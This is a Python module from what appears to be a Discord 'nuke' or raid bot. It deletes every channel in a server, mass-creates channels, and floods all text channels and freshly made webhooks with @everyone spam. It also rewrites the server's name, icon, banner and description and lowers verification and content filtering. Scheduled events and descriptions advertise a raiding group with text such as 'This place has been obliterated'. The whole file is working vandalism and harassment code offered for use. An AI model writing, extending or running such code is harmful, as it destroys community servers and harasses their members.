from __future__ import annotations
import asyncio
import os
import logging
import random
from typing import Optional
from urllib.parse import quote

import aiohttp
import discord
from aiolimiter import AsyncLimiter

from .settings import Settings, State, MISSING, now as utils_now
from .ratelimit import limiter


API = "https://discord.com/api/v10"


class Operations:
    def __init__(self, bot: discord.Client):
        self.bot = bot
        self.settings: Settings = Settings.load()
        self.session: Optional[aiohttp.ClientSession] = None
        self.limiter: Optional[AsyncLimiter] = None
        self.http_limiter: Optional[limiter] = None
        self.token: str = ""
        self.bot_id: str = ""

    async def setup(self):
        if not hasattr(self.bot.http, "fast_limiter"):
            self.bot.http.fast_limiter = limiter(self.bot.http)
        self.http_limiter = self.bot.http.fast_limiter
        self.session = aiohttp.ClientSession()
        self.http_limiter.override_session = self.session
        rps = max(1, self.settings.requests_per_second)
        self.limiter = AsyncLimiter(rps, 1)
        self.token = self._get_token()
        self.bot_id = str(self.bot.user.id)
        logging.info(f"[ops] setup token={'set' if self.token else 'MISSING'} len={len(self.token)}")
        # direct test
        try:
            async with aiohttp.ClientSession() as test_s:
                async with asyncio.timeout(5.0):
                    async with test_s.get(f"{API}/users/@me", headers={"Authorization": f"Bot {self.token}"}) as r:
                        logging.info(f"[ops] direct test status={r.status}")
                        await r.read()
        except Exception as e:
            logging.error(f"[ops] direct test failed: {e!r}")

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()
        if self.http_limiter:
            await self.http_limiter.close()

    def _auth(self) -> dict:
        return {"Authorization": f"Bot {self.token}"}

    async def _req(self, method: str, route: str, url: str, **kwargs):
        headers = kwargs.pop("headers", {}) or {}
        headers.update(self._auth())
        kwargs["headers"] = headers
        try:
            async with self.limiter:
                return await asyncio.wait_for(
                    self.http_limiter.request(method, route, url, **kwargs),
                    timeout=10.0,
                )
        except asyncio.TimeoutError:
            logging.error(f"[req] TIMEOUT {method} {url}")
            raise
        except Exception as e:
            logging.error(f"[req] FAIL {method} {url}: {e!r}")
            raise

    def _get_token(self) -> str:
        token = getattr(self.bot.http, "token", None)
        if token:
            return token
        for attr in ("_token", "__token"):
            t = getattr(self.bot.http, attr, None)
            if t:
                return t
        return ""

    def _pick_name(self) -> str:
        names = self.settings.channel_names
        return random.choice(names) if names else "fluked"

    async def CrChannel(self, guild: discord.Guild) -> int:
        count = self.settings.channel_count
        names_pool = self.settings.channel_names or ["fluked"]
        tasks = []
        for i in range(count):
            base = names_pool[i % len(names_pool)]
            name = f"{base}-{i}" if count > len(names_pool) else base
            tasks.append(asyncio.create_task(self._create_channel(guild.id, name, i)))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        ok = sum(1 for r in results if not isinstance(r, Exception) and r)
        for r in results:
            if isinstance(r, Exception):
                logging.error(f"[CrChannel] task failed: {r!r}")
        logging.info(f"[CrChannel] {ok}/{count} created")
        return ok

    async def _create_channel(self, guild_id: int, name: str, idx: int = 0) -> bool:
        url = f"{API}/guilds/{guild_id}/channels"
        route = f"guilds:{guild_id}:channels"
        payload = {"name": name, "type": 0}
        try:
            res = await self._req("POST", route, url, json=payload)
            status = res.status
            try:
                await res.read()
            finally:
                res.release()
            if status in (200, 201):
                return True
            logging.warning(f"[CrChannel #{idx}] status={status} name={name!r}")
            return False
        except Exception as e:
            logging.error(f"[CrChannel #{idx}] exception: {e!r}")
            return False

    async def DelChannels(self, guild: discord.Guild) -> int:
        channels = list(guild.channels)
        tasks = [asyncio.create_task(self._delete_channel(c.id, c.__class__.__name__.lower())) for c in channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return sum(1 for r in results if not isinstance(r, Exception) and r)

    async def _delete_channel(self, channel_id: int, _kind: str) -> bool:
        url = f"{API}/channels/{channel_id}"
        route = f"channels:{channel_id}"
        try:
            res = await self._req("DELETE", route, url)
            try:
                await res.read()
            finally:
                res.release()
            return 200 <= res.status < 300
        except Exception:
            return False

    async def spam(self, guild: discord.Guild) -> int:
        text_channels = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages]
        if not text_channels:
            return 0
        tasks = []
        for _ in range(self.settings.spam_count):
            for channel in text_channels:
                tasks.append(asyncio.create_task(self._send_spam(channel.id, guild.id)))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return sum(1 for r in results if not isinstance(r, Exception) and r)

    async def _send_spam(self, channel_id: int, guild_id: int):
        url = f"{API}/channels/{channel_id}/messages"
        route = f"channels:{channel_id}:messages"
        payload = {"content": self.settings.spam_message, "allowed_mentions": {"parse": ["users", "roles", "everyone"]}, "tts": False}
        try:
            res = await self._req("POST", route, url, json=payload)
            try:
                await res.read()
            finally:
                res.release()
            return res.status in (200, 201)
        except Exception:
            return None

    async def mess_server(self, guild: discord.Guild) -> None:
        settings = self.settings
        server_banner = None
        server_splash = None
        server_icon = None
        icon_path = "assets/zne.png"
        banner_path = "assets/zne_banner.png"

        logging.info(f"[mess_server] enter guild={guild.id}")

        if os.path.exists(icon_path):
            with open(icon_path, "rb") as file:
                server_icon = file.read()

        if guild.premium_tier > 1 and os.path.exists(banner_path):
            with open(banner_path, "rb") as file:
                server_splash = file.read()
            server_banner = server_splash

        logging.info(f"[mess_server] deleting scheduled events")
        asyncio.create_task(self._delete_scheduled_events(guild.id))

        event_kwargs = {
            "name": State.get_phrase(),
            "privacy_level": 2,
            "entity_type": 3,
            "scheduled_start_time": utils_now(seconds=3).isoformat(),
            "scheduled_end_time": utils_now().replace(year=2029).isoformat(),
            "description": "Join ZNE and start dominating servers today! https://discord.gg/Y6qZ4TKRM5",
            "entity_metadata": {"location": "https://discord.gg/Y6qZ4TKRM5 | https://zne.breed.rip"},
        }
        if server_banner is not None:
            event_kwargs["image"] = server_banner
        asyncio.create_task(self._create_scheduled_event(guild.id, event_kwargs))

        edit_payload = {
            "name": settings.server_name,
            "description": "This place has been obliterated by https://discord.gg/Y6qZ4TKRM5. Join now if you want a bot like this.",
            "default_notifications": 1,
            "verification_level": 0,
            "explicit_content_filter": 0,
            "premium_progress_bar_enabled": True,
        }
        if server_icon:
            edit_payload["icon"] = server_icon
        if server_splash is not None:
            edit_payload["splash"] = server_splash
        if server_banner is not None:
            edit_payload["banner"] = server_banner

        url = f"{API}/guilds/{guild.id}"
        route = f"guilds:{guild.id}"
        try:
            logging.info(f"[mess_server] PATCH {url} (session={self.session}, closed={self.session.closed})")
            res = await self._req("PATCH", route, url, json=edit_payload)
            logging.info(f"[mess_server] PATCH status={res.status}")
            try:
                await res.read()
            finally:
                res.release()
        except Exception as e:
            logging.error(f"[mess_server] PATCH failed: {e!r}")
        logging.info(f"[mess_server] done")

    async def _delete_scheduled_events(self, guild_id: int):
        url = f"{API}/guilds/{guild_id}/scheduled-events"
        route = f"guilds:{guild_id}:scheduled-events"
        try:
            res = await self._req("GET", route, url)
            if res.status != 200:
                try:
                    await res.read()
                finally:
                    res.release()
                return
            data = await res.json()
            res.release()
            for ev in data:
                eid = ev.get("id")
                if not eid:
                    continue
                asyncio.create_task(self._safe_delete_event(guild_id, eid))
        except Exception:
            pass

    async def _safe_delete_event(self, guild_id: int, event_id: str):
        url = f"{API}/guilds/{guild_id}/scheduled-events/{event_id}"
        route = f"guilds:{guild_id}:scheduled-events:{event_id}"
        try:
            res = await self._req("DELETE", route, url)
            try:
                await res.read()
            finally:
                res.release()
        except Exception:
            pass

    async def _create_scheduled_event(self, guild_id: int, payload: dict):
        url = f"{API}/guilds/{guild_id}/scheduled-events"
        route = f"guilds:{guild_id}:scheduled-events"
        try:
            res = await self._req("POST", route, url, json=payload)
            try:
                await res.read()
            finally:
                res.release()
        except Exception:
            pass

    async def _safe(self, coro):
        try:
            await coro
        except Exception:
            pass

    async def spam_webhook(self, guild: discord.Guild) -> int:
        text_channels = [c for c in guild.text_channels if c.permissions_for(guild.me).manage_webhooks]
        if not text_channels:
            return 0

        webhook_ids = await asyncio.gather(*[self._create_webhook(c.id) for c in text_channels])
        valid = [w for w in webhook_ids if w]
        if not valid:
            return 0

        send_tasks = []
        for _ in range(self.settings.webhook_count):
            for wid, wtoken in valid:
                send_tasks.append(asyncio.create_task(self._send_webhook(wid, wtoken)))

        results = await asyncio.gather(*send_tasks, return_exceptions=True)
        return sum(1 for r in results if not isinstance(r, Exception) and r)

    async def _create_webhook(self, channel_id: int):
        url = f"{API}/channels/{channel_id}/webhooks"
        route = f"channels:{channel_id}:webhooks"
        payload = {"name": self.settings.webhook_name}
        try:
            res = await self._req("POST", route, url, json=payload)
            if res.status in (200, 201):
                data = await res.json()
                res.release()
                return (data.get("id"), data.get("token"))
            try:
                await res.read()
            finally:
                res.release()
        except Exception:
            return None
        return None

    async def _send_webhook(self, webhook_id: str, webhook_token: str) -> bool:
        url = f"{API}/webhooks/{webhook_id}/{webhook_token}"
        route = f"webhooks:{webhook_id}:send"
        payload = {
            "content": self.settings.webhook_message,
            "username": self.settings.webhook_name,
            "allowed_mentions": {"parse": ["users", "roles", "everyone"]},
        }
        try:
            res = await self._req("POST", route, url, json=payload)
            try:
                await res.read()
            finally:
                res.release()
            return 200 <= res.status < 300
        except Exception:
            return False
